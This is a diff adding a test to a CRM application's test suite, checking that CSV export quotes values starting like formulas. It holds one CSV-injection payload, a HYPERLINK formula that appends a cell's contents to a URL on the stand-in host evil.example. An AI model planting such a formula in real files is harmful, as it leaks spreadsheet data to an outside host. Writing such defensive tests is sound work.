@@ -263,6 +263,19 @@ async def test_csv_in_and_out_and_the_dashboard(client, llm, temporal):
     assert (
         out.status_code == 200 and "Ali" in out.text and out.text.splitlines()[0].startswith("﻿Name")
     )
+    # P52: a value that starts like a formula (from a web form or another system) is quoted
+    # in the export, so it cannot run when the file is opened in a spreadsheet.
+    evil = '=HYPERLINK("https://evil.example/?x="&A2,"Click")'
+    made = await post(client, "/api/crm/objects/members/records", {"values": {"name": evil}})
+    assert made.status_code == 201, made.text
+    out = await client.get("/api/crm/objects/members/export.csv")
+    assert "'=HYPERLINK(" in out.text and "\n=HYPERLINK(" not in out.text
+    # Remove it again so the totals below are about the imported members only.
+    gone = await client.delete(
+        f"/api/crm/objects/members/records/{made.json()['id']}",
+        headers={**csrf(client), "content-type": "application/json"},
+    )
+    assert gone.status_code == 204, gone.text
     r = await post(
         client,
         "/api/crm/widgets",
